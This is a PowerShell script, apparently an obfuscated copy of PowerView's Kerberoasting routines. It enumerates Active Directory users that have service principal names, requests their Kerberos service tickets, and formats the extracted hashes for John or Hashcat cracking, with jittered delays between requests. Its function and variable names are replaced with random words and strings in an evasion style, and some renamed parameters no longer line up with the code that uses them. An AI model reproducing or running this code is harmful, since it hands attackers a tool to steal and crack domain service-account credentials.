function roomfuls {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $XxforRiW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $dRWqycKC99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $BxfgCWNs99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $ERCJzunB99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmJBwRna99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $MUHDJuWD99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $kxtodvtx99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $XAVhvwkF99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $plKpWxRh99 = 120,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $vmNbRwDm99,
        [Switch]
        $fQncfXBP99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $YjtceLDe99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $blHpJHsE99 = $XxforRiW99
        }
        else {
            if ($PSBoundParameters['Credential']) {
                $ngzUcQUg99 = intemperate -YjtceLDe99 $YjtceLDe99
            }
            else {
                $ngzUcQUg99 = intemperate
            }
            $blHpJHsE99 = $ngzUcQUg99.Name
        }
        if (-not $PSBoundParameters['Server']) {
            try {
                if ($ngzUcQUg99) {
                    $PPZJLUjR99 = $ngzUcQUg99.PdcRoleOwner.Name
                }
                elseif ($PSBoundParameters['Credential']) {
                    $PPZJLUjR99 = ((intemperate -YjtceLDe99 $YjtceLDe99).PdcRoleOwner).Name
                }
                else {
                    $PPZJLUjR99 = ((intemperate).PdcRoleOwner).Name
                }
            }
            catch {
                throw "[roomfuls] Error in retrieving PDC for current domain: $_"
            }
        }
        else {
            $PPZJLUjR99 = $MUHDJuWD99
        }
        $YSMNrvpZ99 = 'LDAP://'
        if ($PPZJLUjR99 -and ($PPZJLUjR99.Trim() -ne '')) {
            $YSMNrvpZ99 += $PPZJLUjR99
            if ($blHpJHsE99) {
                $YSMNrvpZ99 += '/'
            }
        }
        if ($PSBoundParameters['SearchBasePrefix']) {
            $YSMNrvpZ99 += $CmJBwRna99 + ','
        }
        if ($PSBoundParameters['SearchBase']) {
            if ($ERCJzunB99 -Match '^GC://') {
                $DN = $ERCJzunB99.ToUpper().Trim('/')
                $YSMNrvpZ99 = ''
            }
            else {
                if ($ERCJzunB99 -match '^LDAP://') {
                    if ($ERCJzunB99 -match "LDAP://.+/.+") {
                        $YSMNrvpZ99 = ''
                        $DN = $ERCJzunB99
                    }
                    else {
                        $DN = $ERCJzunB99.SubString(7)
                    }
                }
                else {
                    $DN = $ERCJzunB99
                }
            }
        }
        else {
            if ($blHpJHsE99 -and ($blHpJHsE99.Trim() -ne '')) {
                $DN = "DC=$($blHpJHsE99.Replace('.', ',DC='))"
            }
        }
        $YSMNrvpZ99 += $DN
        Write-Verbose "[roomfuls] search string: $YSMNrvpZ99"
        if ($YjtceLDe99 -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[roomfuls] Using alternate credentials for LDAP connection"
            $ngzUcQUg99 = New-Object DirectoryServices.DirectoryEntry($YSMNrvpZ99, $YjtceLDe99.UserName, $YjtceLDe99.GetNetworkCredential().Password)
            $bfOKdhlo99 = New-Object System.DirectoryServices.DirectorySearcher($ngzUcQUg99)
        }
        else {
            $bfOKdhlo99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$YSMNrvpZ99)
        }
        $bfOKdhlo99.PageSize = $XAVhvwkF99
        $bfOKdhlo99.SearchScope = $kxtodvtx99
        $bfOKdhlo99.CacheResults = $False
        $bfOKdhlo99.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
        if ($PSBoundParameters['ServerTimeLimit']) {
            $bfOKdhlo99.ServerTimeLimit = $plKpWxRh99
        }
        if ($PSBoundParameters['Tombstone']) {
            $bfOKdhlo99.Tombstone = $True
        }
        if ($PSBoundParameters['LDAPFilter']) {
            $bfOKdhlo99.filter = $dRWqycKC99
        }
        if ($PSBoundParameters['SecurityMasks']) {
            $bfOKdhlo99.SecurityMasks = Switch ($vmNbRwDm99) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }
        if ($PSBoundParameters['Properties']) {
            $BhNZfMCk99 = $BxfgCWNs99| ForEach-Object { $_.Split(',') }
            $Null = $bfOKdhlo99.PropertiesToLoad.AddRange(($BhNZfMCk99))
        }
        $bfOKdhlo99
    }
}
function fruition {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $BxfgCWNs99
    )
    $RoIJiZxE99 = @{}
    $BxfgCWNs99.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                $RoIJiZxE99[$_] = $BxfgCWNs99[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $RoIJiZxE99[$_] = $BxfgCWNs99[$_][0] -as $jqoyhGxe99
            }
            elseif ($_ -eq 'samaccounttype') {
                $RoIJiZxE99[$_] = $BxfgCWNs99[$_][0] -as $VltERXlj99
            }
            elseif ($_ -eq 'objectguid') {
                $RoIJiZxE99[$_] = (New-Object Guid (,$BxfgCWNs99[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $RoIJiZxE99[$_] = $BxfgCWNs99[$_][0] -as $rrZoYrEp99
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                $eaeOrLEP99 = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $BxfgCWNs99[$_][0], 0
                if ($eaeOrLEP99.Owner) {
                    $RoIJiZxE99['Owner'] = $eaeOrLEP99.Owner
                }
                if ($eaeOrLEP99.Group) {
                    $RoIJiZxE99['Group'] = $eaeOrLEP99.Group
                }
                if ($eaeOrLEP99.DiscretionaryAcl) {
                    $RoIJiZxE99['DiscretionaryAcl'] = $eaeOrLEP99.DiscretionaryAcl
                }
                if ($eaeOrLEP99.SystemAcl) {
                    $RoIJiZxE99['SystemAcl'] = $eaeOrLEP99.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($BxfgCWNs99[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $RoIJiZxE99[$_] = "NEVER"
                }
                else {
                    $RoIJiZxE99[$_] = [datetime]::fromfiletime($BxfgCWNs99[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                if ($BxfgCWNs99[$_][0] -is [System.MarshalByRefObject]) {
                    $Temp = $BxfgCWNs99[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $RoIJiZxE99[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    $RoIJiZxE99[$_] = ([datetime]::FromFileTime(($BxfgCWNs99[$_][0])))
                }
            }
            elseif ($BxfgCWNs99[$_][0] -is [System.MarshalByRefObject]) {
                $Prop = $BxfgCWNs99[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $RoIJiZxE99[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[fruition] error: $_"
                    $RoIJiZxE99[$_] = $Prop[$_]
                }
            }
            elseif ($BxfgCWNs99[$_].count -eq 1) {
                $RoIJiZxE99[$_] = $BxfgCWNs99[$_][0]
            }
            else {
                $RoIJiZxE99[$_] = $BxfgCWNs99[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $RoIJiZxE99
    }
    catch {
        Write-Warning "[fruition] Error parsing LDAP properties : $_"
    }
}
function intemperate {
    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $XxforRiW99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $YjtceLDe99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose '[intemperate] Using alternate credentials for intemperate'
            if ($PSBoundParameters['Domain']) {
                $blHpJHsE99 = $XxforRiW99
            }
            else {
                $blHpJHsE99 = $YjtceLDe99.GetNetworkCredential().Domain
                Write-Verbose "[intemperate] Extracted domain '$blHpJHsE99' from -YjtceLDe99"
            }
            $KiSVgkuG99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $blHpJHsE99, $YjtceLDe99.UserName, $YjtceLDe99.GetNetworkCredential().Password)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($KiSVgkuG99)
            }
            catch {
                Write-Verbose "[intemperate] The specified domain '$blHpJHsE99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $KiSVgkuG99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $XxforRiW99)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($KiSVgkuG99)
            }
            catch {
                Write-Verbose "[intemperate] The specified domain '$XxforRiW99' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[intemperate] Error retrieving the current domain: $_"
            }
        }
    }
}
function priestly {
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,
        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $kKBguapN99 = 'John',
        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $LUuMIdXP99 = .3,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $YjtceLDe99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
        if ($PSBoundParameters['Credential']) {
            $MOFosqdb99 = Invoke-UserImpersonation -YjtceLDe99 $YjtceLDe99
        }
    }
    PROCESS {
        if ($PSBoundParameters['User']) {
            $koSBDeyv99 = $User
        }
        else {
            $koSBDeyv99 = $SPN
        }
	
	$wGsKRCSd99 = New-Object System.Random
        ForEach ($Object in $koSBDeyv99) {
            if ($PSBoundParameters['User']) {
                $sLgtImxH99 = $Object.ServicePrincipalName
                $bElPnjzP99 = $Object.SamAccountName
                $PDPZxPSF99 = $Object.DistinguishedName
            }
            else {
                $sLgtImxH99 = $Object
                $bElPnjzP99 = 'UNKNOWN'
                $PDPZxPSF99 = 'UNKNOWN'
            }
            if ($sLgtImxH99 -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $sLgtImxH99 = $sLgtImxH99[0]
            }
            try {
                $RFIipxox99 = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $sLgtImxH99
            }
            catch {
                Write-Warning "[priestly] Error requesting ticket for SPN '$sLgtImxH99' from user '$PDPZxPSF99' : $_"
            }
            if ($RFIipxox99) {
                $HBiluEIl99 = $RFIipxox99.GetRequest()
            }
            if ($HBiluEIl99) {
                $Out = New-Object PSObject
                $hlmqGvLQ99 = [System.BitConverter]::ToString($HBiluEIl99) -replace '-'
                if($hlmqGvLQ99 -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $VJYIXaGe99 = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $jiVzUpWv99 = $Matches.DataToEnd.Substring(0,$VJYIXaGe99*2)
                    if($Matches.DataToEnd.Substring($VJYIXaGe99*2, 4) -ne 'A482') {
                        Write-Warning 'Error parsing ciphertext for the SPN  $($RFIipxox99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"'
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($HBiluEIl99).Replace('-',''))
                    } else {
                        $Hash = "$($jiVzUpWv99.Substring(0,32))`$$($jiVzUpWv99.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($RFIipxox99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($HBiluEIl99).Replace('-',''))
                }
                if($Hash) {
                    if ($kKBguapN99 -match 'John') {
                        $apnOzBYE99 = "`$ajdqNmMU99`$$($RFIipxox99.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($PDPZxPSF99 -ne 'UNKNOWN') {
                            $pgwxBqCp99 = $PDPZxPSF99.SubString($PDPZxPSF99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $pgwxBqCp99 = 'UNKNOWN'
                        }
                        $apnOzBYE99 = "`$ajdqNmMU99`$$($Etype)`$*$bElPnjzP99`$$pgwxBqCp99`$$($RFIipxox99.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $apnOzBYE99
                }
                $Out | Add-Member Noteproperty 'SamAccountName' $bElPnjzP99
                $Out | Add-Member Noteproperty 'DistinguishedName' $PDPZxPSF99
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $RFIipxox99.ServicePrincipalName
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                Write-Output $Out
            }
            Start-Sleep -Seconds $wGsKRCSd99.Next((1-$LUuMIdXP99)*$Delay, (1+$LUuMIdXP99)*$Delay)
        }
    }
    END {
        if ($MOFosqdb99) {
            Invoke-RevertToSelf -TokenHandle $MOFosqdb99
        }
    }
}
function advertisement {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $WZbcqTvk99,
        [Switch]
        $SPN,
        [Switch]
        $DdrySvCC99,
        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $dKgiTgcq99,
        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $sXRjwAwj99,
        [Switch]
        $RHDbKkoi99,
        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $JUQKVlqW99,
        [ValidateNotNullOrEmpty()]
        [String]
        $XxforRiW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $dRWqycKC99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $BxfgCWNs99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $ERCJzunB99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $MUHDJuWD99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $kxtodvtx99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $XAVhvwkF99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $plKpWxRh99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $vmNbRwDm99,
        [Switch]
        $fQncfXBP99,
        [Alias('ReturnOne')]
        [Switch]
        $IEISPaya99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $YjtceLDe99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $rwOGaDkY99 = @{}
        if ($PSBoundParameters['Domain']) { $rwOGaDkY99['Domain'] = $XxforRiW99 }
        if ($PSBoundParameters['Properties']) { $rwOGaDkY99['Properties'] = $BxfgCWNs99 }
        if ($PSBoundParameters['SearchBase']) { $rwOGaDkY99['SearchBase'] = $ERCJzunB99 }
        if ($PSBoundParameters['Server']) { $rwOGaDkY99['Server'] = $MUHDJuWD99 }
        if ($PSBoundParameters['SearchScope']) { $rwOGaDkY99['SearchScope'] = $kxtodvtx99 }
        if ($PSBoundParameters['ResultPageSize']) { $rwOGaDkY99['ResultPageSize'] = $XAVhvwkF99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $rwOGaDkY99['ServerTimeLimit'] = $plKpWxRh99 }
        if ($PSBoundParameters['SecurityMasks']) { $rwOGaDkY99['SecurityMasks'] = $vmNbRwDm99 }
        if ($PSBoundParameters['Tombstone']) { $rwOGaDkY99['Tombstone'] = $fQncfXBP99 }
        if ($PSBoundParameters['Credential']) { $rwOGaDkY99['Credential'] = $YjtceLDe99 }
        $qpNPfRmv99 = roomfuls @SearcherArguments
    }
    PROCESS {
        if ($qpNPfRmv99) {
            $hYDYqYNI99 = ''
            $NvlrNNuj99 = ''
            $WZbcqTvk99 | Where-Object {$_} | ForEach-Object {
                $XuWEhUGC99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($XuWEhUGC99 -match '^S-1-') {
                    $hYDYqYNI99 += "(objectsid=$XuWEhUGC99)"
                }
                elseif ($XuWEhUGC99 -match '^CN=') {
                    $hYDYqYNI99 += "(distinguishedname=$XuWEhUGC99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $VGIIzUfc99 = $XuWEhUGC99.SubString($XuWEhUGC99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[advertisement] Extracted domain '$VGIIzUfc99' from '$XuWEhUGC99'"
                        $rwOGaDkY99['Domain'] = $VGIIzUfc99
                        $qpNPfRmv99 = roomfuls @SearcherArguments
                        if (-not $qpNPfRmv99) {
                            Write-Warning "[advertisement] Unable to retrieve domain searcher for '$VGIIzUfc99'"
                        }
                    }
                }
                elseif ($XuWEhUGC99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $iQTFgMoP99 = (([Guid]$XuWEhUGC99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $hYDYqYNI99 += "(objectguid=$iQTFgMoP99)"
                }
                elseif ($XuWEhUGC99.Contains('\')) {
                    $ZFgaoYuo99 = $XuWEhUGC99.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($ZFgaoYuo99) {
                        $pgwxBqCp99 = $ZFgaoYuo99.SubString(0, $ZFgaoYuo99.IndexOf('/'))
                        $KdbjPmfR99 = $XuWEhUGC99.Split('\')[1]
                        $hYDYqYNI99 += "(samAccountName=$KdbjPmfR99)"
                        $rwOGaDkY99['Domain'] = $pgwxBqCp99
                        Write-Verbose "[advertisement] Extracted domain '$pgwxBqCp99' from '$XuWEhUGC99'"
                        $qpNPfRmv99 = roomfuls @SearcherArguments
                    }
                }
                else {
                    $hYDYqYNI99 += "(samAccountName=$XuWEhUGC99)"
                }
            }
            if ($hYDYqYNI99 -and ($hYDYqYNI99.Trim() -ne '') ) {
                $NvlrNNuj99 += "(|$hYDYqYNI99)"
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[advertisement] Searching for non-null service principal names'
                $NvlrNNuj99 += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[advertisement] Searching for users who can be delegated'
                $NvlrNNuj99 += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[advertisement] Searching for users who are sensitive and not trusted for delegation'
                $NvlrNNuj99 += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[advertisement] Searching for adminCount=1'
                $NvlrNNuj99 += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[advertisement] Searching for users that are trusted to authenticate for other principals'
                $NvlrNNuj99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[advertisement] Searching for user accounts that do not require kerberos preauthenticate'
                $NvlrNNuj99 += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[advertisement] Using additional LDAP filter: $dRWqycKC99"
                $NvlrNNuj99 += "$dRWqycKC99"
            }
            $iEKjqYRi99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $qZGAFJsz99 = $_.Substring(4)
                    $lWAeMxTd99 = [Int]($rrZoYrEp99::$qZGAFJsz99)
                    $NvlrNNuj99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$lWAeMxTd99))"
                }
                else {
                    $lWAeMxTd99 = [Int]($rrZoYrEp99::$_)
                    $NvlrNNuj99 += "(userAccountControl:1.2.840.113556.1.4.803:=$lWAeMxTd99)"
                }
            }
            $qpNPfRmv99.filter = "(&(samAccountType=805306368)$NvlrNNuj99)"
            Write-Verbose "[advertisement] filter string: $($qpNPfRmv99.filter)"
            if ($PSBoundParameters['FindOne']) { $shQRohMo99 = $qpNPfRmv99.FindOne() }
            else { $shQRohMo99 = $qpNPfRmv99.FindAll() }
            $shQRohMo99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = fruition -BxfgCWNs99 $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($shQRohMo99) {
                try { $shQRohMo99.dispose() }
                catch {
                    Write-Verbose "[advertisement] Error disposing of the Results object: $_"
                }
            }
            $qpNPfRmv99.dispose()
        }
    }
}
function quicker {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $WZbcqTvk99,
        [ValidateNotNullOrEmpty()]
        [String]
        $XxforRiW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $dRWqycKC99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $ERCJzunB99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $MUHDJuWD99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $kxtodvtx99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $XAVhvwkF99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $plKpWxRh99,
        [Switch]
        $fQncfXBP99,
        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $LUuMIdXP99 = .3,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $kKBguapN99 = 'John',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $YjtceLDe99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $EYSGGoka99 = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $EYSGGoka99['Domain'] = $XxforRiW99 }
        if ($PSBoundParameters['LDAPFilter']) { $EYSGGoka99['LDAPFilter'] = $dRWqycKC99 }
        if ($PSBoundParameters['SearchBase']) { $EYSGGoka99['SearchBase'] = $ERCJzunB99 }
        if ($PSBoundParameters['Server']) { $EYSGGoka99['Server'] = $MUHDJuWD99 }
        if ($PSBoundParameters['SearchScope']) { $EYSGGoka99['SearchScope'] = $kxtodvtx99 }
        if ($PSBoundParameters['ResultPageSize']) { $EYSGGoka99['ResultPageSize'] = $XAVhvwkF99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $EYSGGoka99['ServerTimeLimit'] = $plKpWxRh99 }
        if ($PSBoundParameters['Tombstone']) { $EYSGGoka99['Tombstone'] = $fQncfXBP99 }
        if ($PSBoundParameters['Credential']) { $EYSGGoka99['Credential'] = $YjtceLDe99 }
        if ($PSBoundParameters['Credential']) {
            $MOFosqdb99 = Invoke-UserImpersonation -YjtceLDe99 $YjtceLDe99
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $EYSGGoka99['Identity'] = $WZbcqTvk99 }
        advertisement @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | priestly -Delay $Delay -kKBguapN99 $kKBguapN99 -LUuMIdXP99 $LUuMIdXP99
    }
    END {
        if ($MOFosqdb99) {
            Invoke-RevertToSelf -TokenHandle $MOFosqdb99
        }
    }
}
